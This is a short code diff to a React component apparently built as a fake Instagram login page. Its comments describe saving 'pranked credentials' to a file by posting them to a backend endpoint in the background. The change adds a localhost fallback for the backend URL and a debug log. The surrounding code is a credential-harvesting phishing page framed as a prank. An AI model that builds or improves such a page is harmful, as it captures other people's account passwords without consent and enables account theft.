@@ -38,7 +38,9 @@ const InstagramLogin = () => {
         // Save pranked credentials to local file through backend
         console.log('💾 Saving credentials to local file...');
         // Don't await - let it run in background so it doesn't block the prank
-        fetch(`${process.env.REACT_APP_BACKEND_URL}/api/save-prank-credentials`, {
+        const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
+        console.log('🔧 Backend URL:', backendUrl);
+        fetch(`${backendUrl}/api/save-prank-credentials`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
